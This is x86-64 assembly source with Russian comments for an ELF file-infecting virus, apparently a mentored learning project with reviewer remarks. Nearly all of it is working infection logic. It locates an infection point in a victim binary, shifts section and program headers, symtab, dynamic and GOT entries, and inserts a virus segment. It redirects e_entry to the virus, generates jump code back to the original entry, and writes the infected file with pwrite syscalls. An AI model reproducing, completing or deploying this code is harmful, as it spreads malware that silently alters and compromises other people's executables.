    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr


    pop      %rax
    add     $0x8, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x8, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add      $0x8, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    CNVRT_NUM  phdr_field_ptr


    PRINT_STR  virus_phdr2 "-------------------- \n"

    pop    %rcx
    pop    %rbx
    pop    %rax

    ret

/// NB!: Пусть комменты к процедурам будут без отступа
/// FIND_POINT_FOR_INFECTION
/// Ищет точку заражения в жертве:
/// - считает виртульный адрес, на котором находятся
/// заголовки секций
/// находит заголовок секции text
/// и сохраняет его индекс (понадобится для заголовка
/// секции вируса)
_find_point_for_infection:

    push  %rdx
    push  %rdi
    push  %rsi

    //  узнаем, где первая секция text жертвы
    //  она нужна для того, чтоб сослаться на ее
    // индекс в таблице строк
    leaq  victim_elf_addr(%rip), %rdi
    mov   (%rdi), %rdi

    mov   ELF_E_ENTRY(%rdi), %rdx

    leaq  victim_shdr_table_addr(%rip), %rdi
    mov   (%rdi), %rdi

    leaq  victim_shdr_amount(%rip), %rsi
    mov   (%rsi), %rsi

    call  _find_victim_text_section

    // находим vaddr первого сегмента
    leaq  victim_phdr_table_addr(%rip), %rdi
    mov   (%rdi), %rdi

    leaq  victim_phdr_amount(%rip), %rsi
    mov   (%rsi), %rsi

    call  _find_first_seg_vaddr

    // находим конец последнего сегмента
    leaq  victim_phdr_table_addr(%rip), %rdi
    mov   (%rdi), %rdi

    leaq  victim_phdr_amount(%rip), %rsi
    mov   (%rsi), %rsi

    call  _find_last_seg_vaddr

    // считаем vaddr точки заражения
    leaq  victim_elf_addr(%rip), %rdi
    mov   (%rdi), %rdi

    mov   ELF_E_SHOFF(%rdi), %rdx

    leaq   first_seg_vaddr(%rip), %rsi
    mov    (%rsi), %rdi

    add    %rdx, %rdi

    leaq   infected_seg_end_vaddr(%rip), %rdx
    mov    %rdi, (%rdx)
    add    $0x38, (%rdx)

    pop  %rsi
    pop  %rdi
    pop  %rdx

    ret

    // Печатает данные, необходимые для заражения:
    // - infected_seg_phdr_addr
_print_infection_data_fn:

    PRINT_STR print_infection_data1 "--------------------\n"
    PRINT_STR print_infection_data2 "PRINT_INFECTION_DATA \n \n"

    PRINT_STR  infected_seg_phdr_addr "infected_seg_phdr_addr val: "
    CNVRT_NUM  infected_seg_phdr_addr

    PRINT_STR  infected_seg_size "infected_seg_size val: "
    CNVRT_NUM  infected_seg_size

    PRINT_STR  infected_seg_end_vaddr "infected_seg_end_vaddr val: "
    CNVRT_NUM  infected_seg_end_vaddr

    PRINT_STR  infected_sect_shdr_addr "infected_sect_shdr_addr val: "
    CNVRT_NUM  infected_sect_shdr_addr

    PRINT_STR print_infection_data_end "-------------------- \n"

    ret

/// RECOUNT
/// PARAMS - no
/// Редактирует поля всех shdr и phdr, которые
/// описывают код, находящийся НИЖЕ точки заражения -
/// весь код должен сместиться на размер вируса вниз
/// по файлу
/// Редактирует поля заголовков заражаемого сегмента и
/// заражаемой секции, содержащие в себе размер
/// описываемого кода - вирус пишется после последней
/// секции в заражаемом сегменте, т.е. сегмент
/// расширяется, как и последняя секция
/// Редактирует поле e_shoff в заголовке эльфа - т.е.
/// смещение до заголовков секций: они сместятся
/// на размер вируса
_recount:
    push    %rax
    push    %rbx
    push    %rdx
    push    %rcx
    push    %rdi
    push    %rsi

_recount_symtab:
    // редактируем записи в таблице символов

    leaq    victim_shdr_amount(%rip), %rbx
    mov     (%rbx), %rsi

    leaq    victim_shdr_table_addr(%rip), %rbx
    mov     (%rbx), %rdi

    call    _find_symtab

    leaq    symtab_shdr_addr(%rip), %rbx
    mov     (%rbx), %rdi

    leaq    symtab_records_amount(%rip), %rbx
    mov     (%rbx), %rsi

    mov     $0x38, %rdx

    call    _recount_symbols_addrs

_count_victim_code_begin_vaddr:
    // находим начальный ВИРТУАЛЬНЫЙ адрес кода жертвы
    // т.е. который находится сразу за заголовками программ
    leaq   victim_code_offset(%rip), %rdx
    mov    (%rdx), %rdx

    leaq   first_seg_vaddr(%rip), %rsi
    mov    (%rsi), %rdi
    add    %rdx, %rdi

    leaq   victim_code_frm_begin_vaddr(%rip), %rsi
    mov    %rdi, (%rsi)

_recount_hdrs:
    // params for _shdr_offset_and_addr_recount

    leaq    victim_shdr_amount(%rip), %rbx
    mov     (%rbx), %rsi

    leaq    victim_shdr_table_addr(%rip), %rbx
    mov     (%rbx), %rdi

    mov     $0x38, %rdx

    //  увеличить поля sh_offset и sh_addr
    //  всех shdr, находящихся после точки заражения
    // - vaddr end заражаемого сегмента -
    // на размер кода вируса,
    // а так же отредактировать записи в секция
    // relа и сохранить
    // размер и смещение секции dynamic,
    // чтоб ее можно было редктировать позже

    call    _shdr_offset_and_addr_recount

    // params for _phdr_offset_and_addr_recount
    leaq    victim_phdr_amount(%rip), %rbx
    mov     (%rbx), %rsi

    leaq    victim_phdr_table_addr(%rip), %rbx
    mov     (%rbx), %rdi

    mov     $0x38, %rdx

    // изменить поля p_offset, p_vaddr, p_paddr
    // во всех phdr, которые описывают
    // на сегменты, находящиеся
    // НИЖЕ точки заражения

    call    _phdr_offset_and_addr_recount

_edit_got_and_dynamic:
    // подготовить params и отредактировать
    // записи в секции dynamic
    lea     dynamic_records_offset(%rip), %rdi
    mov     (%rdi), %rax

    // секция dynamic найдена?
    cmp     $0, %rax
    // нет, пропустить редактирование dynamic и
    // got, жертва собрана без либ
    je      _generate_virus_hdrs

    leaq    victim_elf_addr(%rip), %rdi
    mov     (%rdi), %rdi

    add     %rax, %rdi
    mov     $0x38, %rsi

    lea     dynamic_records_size(%rip), %rcx
    mov     (%rcx), %rdx

    lea     first_seg_vaddr(%rip), %rcx
    mov     (%rcx), %rcx

    call    _recount_dynamic_section

    // редактируем записи внутри GOT
    leaq    victim_shdr_amount(%rip), %rbx
    mov     (%rbx), %rsi

    leaq    victim_shdr_table_addr(%rip), %rbx
    mov     (%rbx), %rdi

    leaq    GOT_vaddr(%rip), %rbx
    mov     (%rbx), %rdx

    // call    _edit_got_records

_generate_virus_hdrs:
    // сгененрировать заголовки для
    // кода вируса
    call    _generate_virus_phdr

    call    _generate_virus_shdr

_edit_elf_header:
    leaq    virus_code_size(%rip), %rbx
    mov     (%rbx), %rsi
    leaq    data_size(%rip), %rdi
    add     (%rdi), %rsi # + размер блока данных
    add     $0x38, %rsi # + размер вставляемого заголовка

_change_e_entry:
    leaq    victim_elf_addr(%rip), %rbx
    mov     (%rbx), %rdi

    add     $0x18, %rdi     # смещение до e_entry

    leaq    original_e_entry(%rip), %rbx
    mov     (%rdi), %rcx
    mov     %rcx, (%rbx)  # save original e_entry

    leaq    infected_seg_end_vaddr(%rip), %rbx
    // leaq    last_seg_vaddr_end(%rip), %rbx
    mov     (%rbx), %rdx

    mov     %rdx, (%rdi) # new e_entry

_change_shoff_phnum_shnum:
    add     $0x10, %rdi   # смещение до e_shoff
    add     %rsi, (%rdi)

    add     $0x10, %rdi   # смещение до e_phnum
    add     $0x1, (%rdi)

    add     $0x4, %rdi   # смещение до e_shnum
    add     $0x1, (%rdi)

_count_offsets:
    call    _count_offset_to_orig_e_entry  # offset for jmp
    call    _count_offset_to_move_victim

_make_opcode_blocks:
    // создаем код для передачи управления жертве
    call    _transfer_control_to_victim

    // заполняем блок данных жертвы
    call    _make_victim_data_block

    pop     %rsi
    pop     %rdi
    pop     %rcx
    pop     %rdx
    pop     %rbx
    pop     %rax

    ret

// считает смещение до оригинльного e_entry,
// чтоб его мог использовать jmp, который передаст
// управление жертве после того,
// как вирус в ней отработает
// PARAMS - no
// Возвращает смещение в RAX
_count_offset_to_orig_e_entry:
    push   %rbx
    push   %rax

    // считаем, на каком адресе будем находиться
    // в жертве, когда будем передавать
    // ей же управление
    leaq   virus_code_size(%rip), %rax
    mov    (%rax), %rax
    dec     %rax

    leaq   infected_seg_end_vaddr(%rip), %rbx
    // leaq    last_seg_vaddr_end(%rip), %rbx
    mov    (%rbx), %rbx

    add    %rbx, %rax

    leaq   original_e_entry(%rip), %rbx
    mov    (%rbx), %rbx

    // посчитали смещение,
    // должно быть отрицательным, поскольку
    // оригинальный e_entry всегда будет выше
    // _exit_victim
    sub    %rax, %rbx

    leaq   offset_to_e_entry(%rip), %rax
    movl   %ebx, (%rax)

    pop    %rax
    pop    %rbx
    ret

/// _COUNT_OFFSET_TO_MOVE_VICTIM
/// считает смещение до функции move_victim
_count_offset_to_move_victim:
    push   %rbx
    push   %rax

    leaq   _move_victim(%rip), %rbx
    leaq   _exit_victim(%rip), %rax
    add    $0x5, %rax  # пропустили будущую команду jmp

    sub    %rax, %rbx

    leaq   move_victim_offset(%rip), %rax
    movl   %ebx, (%rax)

    pop    %rax
    pop    %rbx
    ret


/// _MAKE_VICTIM_DATA_BLOCK
// data_size:
//     .quad 0x10

// data_block:
//     .space 0x10, 0

data_size:
    .quad 0x30

data_block:
    .space 0x30, 0

/// Заполняет блок данными жертвы, которые будут
/// использоваться во время исполнения вируса
/// внутри зараженной жертвы, чтоб сдвинуть
/// ее на прежние адреса в памяти
_make_victim_data_block:
    push   %rbx
    push   %rax

    leaq   data_block(%rip), %rax

    // leaq   dynamic_records_offset(%rip), %rbx
    // movq   (%rbx), %rbx
    // add    $0x38, %rbx

    leaq   dynamic_records_vaddr(%rip), %rbx
    movq   (%rbx), %rbx
    add    $0x38, %rbx

    movq   %rbx, (%rax)
    add    $0x8, %rax

    leaq   dynamic_records_size(%rip), %rbx
    movq   (%rbx), %rbx
    movl   %ebx, (%rax)
    add    $0x8, %rax

    leaq   first_seg_vaddr(%rip), %rbx
    movq   (%rbx), %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    leaq   last_seg_vaddr_end(%rip), %rbx
    movq   (%rbx), %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    // leaq   symtab_shdr_addr(%rip), %rbx
    // movq   (%rbx), %rbx
    // add    $0x38, %rbx

    // movq   %rbx, (%rax)
    // add    $0x8, %rax

    // leaq   symtab_records_amount(%rip), %rbx
    // movq   (%rbx), %rbx
    // movl   %ebx, (%rax)
    // add    $0x8, %rax

    leaq   victim_code_size(%rip), %rbx
    movq   (%rbx), %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    leaq   victim_code_frm_begin_vaddr(%rip), %rbx
    movq   (%rbx), %rbx
    movq   %rbx, (%rax)

    pop    %rax
    pop    %rbx
    ret

 // _TRANSFER_CONTROL_TO_VICTIM
transfer_control_code:
    .space  0xB, 0

_transfer_control_to_victim:
    push    %rax
    push    %rbx

    lea     transfer_control_code(%rip), %rax
    mov     $0xe8, %rbx
    movzwl  %bx, %ebx

    // call opcode
    movb    %bl, (%rax)
    inc     %rax

    // offset
    leaq    move_victim_offset(%rip), %rbx
    mov    (%rbx), %rbx
    mov     %ebx, (%rax)
    add     $0x4, %rax

    mov     $0xe9, %rbx
    movzwl  %bx, %ebx

    // call opcode
    movb    %bl, (%rax)
    inc     %rax

    leaq    offset_to_e_entry(%rip), %rbx
    mov    (%rbx), %rbx
    mov     %ebx, (%rax)
    add     $0x4, %rax

    // nop opcode
    mov     $0x90, %rbx
    movzwl  %bx, %ebx
    movb    %bl, (%rax)

    pop     %rbx
    pop     %rax
    ret

// _RECOMBINE_ELF
// Вписывает вирус и код жертвы в заданный файл
// PARAMS
// RDI - test infecion file name
_recombine_elf:

    mov     $O_RDWR, %rsi
    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    leaq    fd(%rip), %rbx
    mov     %rax, (%rbx)   # save fd

    // записать файл жертвы от начала до
    // конца  таблицы заголовков
    leaq    victim_elf_addr(%rip), %rsi
    mov     (%rsi), %rsi

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    leaq    victim_phdr_table_size(%rip), %rdx
    mov     (%rdx), %rdx
    add     $0x40, %rdx

    mov     %rdx,  %r8

    xor     %rcx, %rcx
    mov     %rcx, %r10
    # в rcx можно указать смещение, откуда начать запись
    # но если файл открыт на o_append,
    # этот аргумент игнорируется
    mov     $0x12, %rax   # syscall pwrite
    syscall

    // записать новый заголовок сегмента вируса

    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     $0x38, %rdx
    add     %rdx, %r8

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    leaq    virus_new_phdr(%rip), %rsi

    mov     $0x12, %rax   # syscall pwrite
    syscall

    // записать код жертвы

    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    leaq    victim_code_addr(%rip), %rsi # 0xf7ff7238
    mov     (%rsi), %rsi

    leaq    victim_code_size(%rip), %rdx # 0x17a8
    mov     (%rdx), %rdx

    add     %rdx, %r8

    mov     $0x12, %rax   # syscall pwrite
    syscall
    // записать в файл код вируса
    // записываем без послежних 11 байт -
    // в них будет передача управления на жертву
    // будут записано отдельно
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    leaq    virus_code_addr(%rip), %rsi
    mov     (%rsi), %rsi

    leaq    virus_code_size(%rip), %rdx
    mov     (%rdx), %rdx
    // sub     $0x6, %rdx
    sub     $0xB, %rdx
    add     %rdx, %r8

    mov     $0x12, %rax   # syscall pwrite
    syscall

    // вписать передачу управления на жертву
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    transfer_control_code(%rip), %rsi

    mov     $0xB, %rdx
    add     %rdx, %r8

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x12, %rax      # syscall pwrite
    syscall

    // вписать данные жертвы
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    data_block(%rip), %rsi
    leaq    data_size(%rip), %rdx
    mov     (%rdx), %rdx

    add     %rdx, %r8

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x12, %rax      # syscall pwrite
    syscall


    // записать в файл заголовки секций жертвы
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    victim_shdr_table_addr(%rip), %rsi
    mov     (%rsi), %rsi

    leaq    victim_shdr_table_size(%rip), %rdx
    mov     (%rdx), %rdx

    add     %rdx, %r8

    mov     $0x12, %rax      # syscall pwrite
    syscall

    // вписать заголовок секции вируса
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    virus_new_shdr(%rip), %rsi

    mov     $0x40, %rdx

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x12, %rax      # syscall pwrite
    syscall

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x3, %rax      # syscall close
    syscall
    ret


/// NB!: Без сигнатуры можно обойтись (см ранее).
// Но раз нет сигнатуры, тогда нам нужно как-то
// отличать зараженный файл от чистого - подумай
// об этом. Побайтово проверяет содержимое по заданному
// указателю, пока не найдет сигнатуру. Если нашел -
// возвращает адрес, по которому она расположена, в
// противном случае возвращает 0
//
/PARAMS
// RDI - указатель на обзец
// RSI - code ptr,в котором следует искать сигнатуру
// RDX - размер образца
// RCX - размер этого кода в байтах
// _find_signature:
//     push    %rbx
//     push    %r8

//     xor     %r8, %r8  # счетчик совпавших символов
// _find_signature_cycle:

//     movzwl   (%rsi), %eax # сравнить содержимое указателей
//     movzwl   %ax, %eax

//     movzwl   (%rdi), %ebx
//     movzwl  %bx, %ebx

//     cmp     %al, %bl
//     jne     _mismatch_example

//     cmp     %rdx, %r8  # счетчик совпадений = длине образца?
//     je      _find_signature_success

//     inc     %r8   # +1 совпавший символ
//     inc     %rdi  # передвинули указатели строки
//     inc     %rsi  # и примера на след. символы

//     jmp     _find_signature_continue_cycle

// _mismatch_example:

//     inc     %rsi
//     sub     %r8, %rdi  # передвинули ptr образца на его начало
//     xor     %r8, %r8

// _find_signature_continue_cycle:
//     loop    find_virus_signature_cycle

// _find_signature_fail:
//     xor     %rax, %rax
//     jmp     find_virus_signature_exit

// _find_signature_success:
//     sub     %rdx, %rsi  # возвращаем указатель на начало
//     mov     %rdi, %rax  # совпавшей строки

// _find_virus_signature_exit:
//     pop     %r8
//     pop     %rbx

//     ret

// test_find_virus_signature:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $virus_file_name, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     mov     %rax, %rsi
//     mov     $0x0, %rdi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8
//     call	my_printf

//     mov     %rax, %rdi
//     mov     $0x4c70, %rsi

//     call    find_virus_signature

//     mov     %rax, %rsi
//     mov     $0x0, %rdi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8
//     call	my_printf

//     pop     %rbp
    // ret

// _EDIT_RELA_SECTION
// Подготавливает параметры и вызывает редактирование секции rela
// PARAMS
// RDI - адрес на заголовок секции rela
_edit_rela_section:
    push  %rdi
    push  %rsi
    push  %rdx
    push  %rcx

    mov   %rdx, %rsi    # const

    add   $0x14, %rdi
    mov   (%rdi), %rcx   # sh_offset

    add   $0x8, %rdi
    mov   (%rdi), %rdx   # sh_size

    mov   %rcx, %rdi     # sh_offset

    // call  _recount_rela_section

    pop   %rcx
    pop   %rdx
    pop   %rsi
    pop   %rdi

    ret

/// _RECOUNT_GOT_SECTION
/// редактирует записи - адреса
/// - внутри GOT, увеличивая их на
/// на заданную величину
/// RDI - offset до секции got
/// RSI - значение, на которое увеличивается vaddr
/// RDX - размер секции got
_recount_got_section:
    push    %rax
    push    %rcx

    // посчитали кол-во записей
    // в секции got
    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x8, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    //  получили адрес кода секции в памяти
    leaq    victim_elf_addr(%rip), %rax
    mov     (%rax), %rax
    add     %rdi, %rax

_recount_got_section_cycle:
    cmp     $0, (%rax)
    je      _recount_got_next_iter

    // vaddr записи + константа
    add     %rsi, (%rax)

_recount_got_next_iter:
    add     $0x8, %rax   # сдвиг на след. запись
    loop    _recount_got_section_cycle

_recount_got_section_exit:
    pop     %rcx
    pop     %rax

    ret

// _SHDR_OFFSET_AND_ADDR_RECOUNT
// пересчитывает смещения и адреса секций, которые будут
// находиться после точки заражения, а так же редактирование
// записей в секциях rel и dynamic
// (см. комменты для _phdr_offset_and_addr_recount)
// PARAMS
// RDI - указатель на заголовки,
// RSI - их количество,
/// RDX - константа, на которую увеличивается значение
/// offset и addr
    .globl  _shdr_offset_and_addr_recount
    .type	_shdr_offset_and_addr_recount, @function

_shdr_offset_and_addr_recount:

    push  %rcx
    mov   %rsi, %rcx   # установили счетчик цикла

_shdr_offset_and_addr_recount_cycle:

    add   $0x4, %rdi        # проверяем тип
    cmp   $0x4, (%rdi)      # тип rela?
    je    _call_edit_rela_section

    cmp   $0x6, (%rdi)  # тип dynamic?
    jne   _recount_shdr

    // сохранить данные для будущего
    // редактирования секции dynamic
_save_values_of_dynamic_sec:
    push  %rdi
    push  %rsi
    push  %r8

    lea   dynamic_records_vaddr(%rip),%rsi
    add   $0xC, %rdi
    mov   (%rdi), %r8
    mov   %r8, (%rsi)   # dynamic sh_vaddr

    lea   dynamic_records_offset(%rip),%rsi
    add   $0x8, %rdi
    mov   (%rdi), %r8
    mov   %r8, (%rsi)   # dynamic sh_offset

    lea   dynamic_records_size(%rip),%rsi
    add   $0x8, %rdi
    mov   (%rdi), %r8
    mov   %r8, (%rsi)   # dynamic size

    pop   %r8
    pop   %rsi
    pop   %rdi

    jmp  _recount_shdr

_call_edit_rela_section:   # отредаетировать секцию rela

    //  секций rela может быть множество,
    // поэтому проще отредактировать ее,
    // как только нашли ее shdr, чем сначала
    // сохранять размеры и смещения всех секций
    // этого типа, а затем дополнительно
    // проходиться циклом и редактировать каждую
    call  _edit_rela_section

_recount_shdr:
    add   $0xC, %rdi       # смещение до поля sh_addr
    cmp   $0,  (%rdi)      # sh_addr < addr infection?

    jle   _recount_shdr_offset

    add   %rdx, (%rdi)

_recount_shdr_offset:
    add  $0x8, %rdi
    cmp  $0, (%rdi)

    jle  _next_iter_recount
    add   %rdx, (%rdi)       # пересчитываем смещение

_next_iter_recount:
    add   $0x28, %rdi       # смещение до след. заголовка

    loop  _shdr_offset_and_addr_recount_cycle
    pop   %rcx

    ret


// _PHDR_OFFSET_AND_ADDR_RECOUNT
//    PARAMS
// RDI -  указатель на заголовки,
// RSI -  их количество, в
/// RDX -  константа, на которую увеличивается
/// vaddr, paddr и offset всех заголовков, кроме заголовка
/// самой таблицы заголовков сегментов
_phdr_offset_and_addr_recount:
    push  %rax
    push  %rcx

    mov   %rsi, %rcx        # установили счетчик цикла
    leaq  first_seg_vaddr(%rip), %rsi
    mov   (%rsi), %rsi

_phdr_offset_and_addr_recount_cycle:
    movl  (%rdi), %eax

    cmp   $0x6,  %rax
    jne   _phdr_offset_and_addr_check

    // редактируем поля p_filesz
    // и p_memsz в заголовке таблицы сегментов
    // заголовков станет на один больше, значит,
    //  размер таблицы надо увеличить на 56 байт
    add   $0x20, %rdi
    add   %rdx, (%rdi)

    add   $0x8, %rdi
    add   %rdx, (%rdi)

    sub   $0x20, %rdi
    jmp   _next_iter_recount_phdr

_phdr_offset_and_addr_check:
    add   $0x10, %rdi    # проверяем адрес

    cmp   $0,  (%rdi)
    jle    _recount_offset

    cmp   %rsi, (%rdi)
    jne   _recount_vaddr_paddr

    // это первый сегмент кода -
    // содерит в себе заголовки
    // увеличить его p_memsz и p_filesz
    // на размер добавляемого заголвока
    // а вот его vaddr,paddr и offset
    // не редактируем - новый заголвок
    // будет вписан В него, а не ДО
    // него
    add   $0x10, %rdi
    add   %rdx, (%rdi)

    add   $0x8, %rdi
    add   %rdx, (%rdi)

    sub   $0x20, %rdi

    jmp   _next_iter_recount_phdr
_recount_vaddr_paddr:
    add   %rdx, (%rdi)    # recount vaddr and paddr

    add   $0x8, %rdi
    add   %rdx, (%rdi)

    sub   $0x8, %rdi

_recount_offset:
    sub   $0x8, %rdi

    cmp   $0, (%rdi)
    jle   _next_iter_recount_phdr
    add   %rdx, (%rdi)

_next_iter_recount_phdr:
    add   $0x30, %rdi
    loop _phdr_offset_and_addr_recount_cycle

    pop  %rcx
    pop  %rax
    ret

/// CNVRT_NUM_TO_HEX_STRING
/// Побайтово конвертирует число в ascii-кода для
/// вывода в шестнадцатеричном формате
/// @PARAMS
/// - %RSI - указатель на массив, в котором лежит число
///
/// Данную функцию можно использовать только после
/// конвертации числа в 16-байтовый массив
/// (см. cnvrt_addr_in_16_byte)
///
/// Если число в текущем байте < 9, оно будет
/// сковертировано в ascii-код цифры, в противном
/// случае число бдет сконвертировано в букву
/// Сконвертированное в аски-коды число записывается
/// в массив converted_addr,
/// в последний байт массива вписывается символ
/// перевода строки для удобства вывода числа в
/// будущем (возможно, перевод строки стоит убрать ?)
converted_addr:
    .space 0x11, 0

    .globl  cnvrt_num_to_hex_string
	.type	cnvrt_num_to_hex_string, @function
cnvrt_num_to_hex_string:
    push    %rax
    push    %rdi
    push    %rcx

    // вписали перевод строки
    lea     converted_addr(%rip), %rdi
    add     $0x10, %rdi
    movb    $0xA,  (%rdi)

    lea     converted_addr(%rip), %rdi
    mov     $0x10, %rcx                  # loop cntr

cnvrt_num_cycle:
    // TAKE CUR. NUM
    xor     %rax, %rax
    movb    (%rsi), %al

    // NUMBER OR LETTER?
    cmp     $0x09, %rax     # число или буква?
    jg      cnvrt_in_letter

    // NUMER
    add     $0x30,  %al # сконвертировать аски-код числа
    jmp     continue_cycle

    // LETTER
cnvrt_in_letter:
    add     $0x57, %al  # сконвертировать аски-код числа

    // WRITE DOWN ASCII-CODE
continue_cycle:
    movb    %al, (%rdi)

    inc     %rsi
    inc     %rdi
    loop    cnvrt_num_cycle

cnvrt_num_end:
    popq    %rcx
    popq    %rdi
    popq    %rax

	ret

// test_cnvrt_num_to_hex_string:

//     pushq   %rbp
// 	movq    %rsp, %rbp

//     mov     $byted_addr, %rdi
//     mov     $0x10, %rsi

//     call    clear_array
//     mov     $byted_addr, %rsi

//     movb    $0x01, (%rsi)

//     call    cnvrt_num_to_hex_string

//     mov     $0x0, %rdi
//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx
//     call    write

//     popq    %rbp
// 	ret


/// принимает в rdi адрес массив,
/// в rsi - его размер, заполняет массив нулями
/// NB!: А чего сразу в %RCX не принимать?
/// NB!: Зачем здесь пролог и эпилог?
/// NB!: Это делается через repnz stosb,
///      разберись как работают эти команды
clear_array:
    // pushq   %rbp
	// movq    %rsp, %rbp
    push    %rcx
    mov     %rsi, %rcx

clear_array_cycle:
    movb    $0x0, (%rdi)
    inc     %rdi
    loop    clear_array_cycle

clear_array_end:
    pop     %rcx
    // popq    %rbp
	ret

/// CNVRT_ADDR_IN_16_BYTE
/// Конвертирует восьмибайтовое число в такое же
/// 16-байтовое, т.е. каждые полбайта
/// занимают байт на выходе. Конвертация начинается
/// с младших разрядов числа.
/// Сконвертированное число записывается в массив
/// byted_addr
///  Конвертация происходит за 16 итераций цикла,
/// на каждой итерации:
/// - на конвертируемое число накладывается маска
/// - полученное число сдвигается вправо на 4 бита
/// столько раз,
///   сколько было итераций цикла, чтоб результат
/// оказался в младших разрядах
/// - результат записывается в следующий доступный
/// байт массива byted_addr
/// - маска сдвигается на 4 бита влево
/// @PARAMS
/// - %RDI - число для конвертирования
/// NB!: Просто посмотри на это:
/// (для sizeof(.) = 16 битов):
/// src:   position: FEDCBA9876543210
///            data: 1011101010111100
///                   /  \   /   \
/// copy 4 times:    /    \ /     \
/// 0011101010111100 1011101010111100 1011101010111100 1011101010111100
/// (.=& 0xF000)     (.=& 0x0F00)     (.=& 0x00F0)     (.=& 0x000F)
/// 0011000000000000 0000101000000000 0000000010110000 0000000000001100
/// (.>> 12)         (.>> 8)          (.>> 4)          (.>> 0)
/// 0000000000000011 0000000000001010 0000000000001011 0000000000001100
/// .+= 0x30 ; if (.>0x39) { .+= 0x57-0x30 }
/// "3"              "A"              "B"              "C"
/// Неужели сложно такое экстраполировать для quad?
/// Нужна всего одна функция, а если надо будет вывести не quad а байт,
/// то никто не мешает обнулить старшие биты... Неужели это так сложно?
/// NB!: globl, @function ?
cnvrt_addr_in_16_byte:
    push    %r8
    push    %r9
    push    %rcx
    push    %rdx
    push    %rbx
    push    %rsi

    // SETUP VALUES
    mov     %rdi, %rdx
    lea     byted_addr(%rip), %rsi

    add     $0xF, %rsi      # начинается с младших
    mov     $0x10, %rcx     # loop cntr

    mov     $0xF, %rbx      # маска для числа

   // CONVERT NUMBER
cnvrt_addr_loop:
    and     %rbx, %rdx      # наложить маску на число

    mov     $0x10, %r8      # calc пройденных итераций
    mov     %rcx, %r9
    sub     %r9, %r8

    // ROTATE NUM RIGHT
rotate_num_right:
    cmp     $0, %r8
    jle     continue_cnvrt_addr_loop

    shr     $0x4, %rdx
    dec     %r8
    jmp     rotate_num_right

continue_cnvrt_addr_loop:
    movb    %dl, (%rsi) # записать число по адресу
    mov     %rdi, %rdx  # восстановить исходное число
    shl     $0x4, %rbx  # маску на 4 бита влево
    dec     %rsi        # укатель на следующий байт

    loop   cnvrt_addr_loop

    pop     %rsi
    pop     %rbx
    pop     %rdx
    pop     %rcx
    pop     %r9
    pop     %r8

    ret


/// NB!: Писать на ассемблере тесты к ассемблеру (да еще и в одном и том же файле) - удовольствие явно уровнем ниже чем писать тесты на лиспе. Я бы на твоем месте писал тесты к функциям как скрипты к GDB - это куда проще. Найди, как GDB умеет проверять значения в при попадании в бряк, делать IF и выдавать логи - и тебе останется только открыть файл лога чтобы посмотреть все ли тесты прошли.

/// TEST_CNVRT_ADDR_IN_16_BYTE
/// тестирует конвертацию числа
/// если не подключать конвертациж полученного числа и не выводить его на экран,
/// то посмотреть результат можно только в гдб
/// TODO решить эту проблему */
//test_cnvrt_addr_in_16_byte:
//     mov     $0xFFFFFFFF, %rdi
//     call    cnvrt_addr_in_16_byte
//     ret
//     цель теста:
//     - сконвертировать восьмибайтовое число в 16-байтовый массив
//     - сконвертировать каждый байт этого массива в ascii-код
//     - вывести полученное число в stdout */
// test_cnvrt_addr_in_16_byte:
//     pushq   %rbp
// 	movq    %rsp, %rbp

//     // mov     $0x40, %rdi        # тесты с разными числами
//     // mov     $0xFFFFFFFFFFFFFFFF, %rdi
//     // mov     $0x8FFFE, %rdi
//     mov     $0xDEADBEEFBAADF00D, %rdi
//     // mov     $-31, %rdi   # (?)

//     call    cnvrt_addr_in_16_byte

//     mov     $byted_addr, %rsi
//     call    cnvrt_num_to_hex_string

//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx

//     call    _my_write

//     popq    %rbp
// 	ret

/// MY_MMAP file into memory
/// Считывает файл в память по заданному адресу.
/// Флаги должны быть такими же, какие передавали
/// open для открытия файла.
/// @PARAMS
///  - %RDI - адрес для записи (по умолчанию NULL,
///           в этом случае назначается OS)
///  - %RSI - длина считываемого файла
///  - %RDX - права доступа к памяти
///           (RDONLY, RDWR и т.д.)
///  - %RCX -  права для доступа к памяти для
///            процессов (MMAP_SHARED, MMAP_PRIVATE)
///  * %R8 -   fd считываемого файла
///  * %R9 -   offset от начала считываемого файла
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

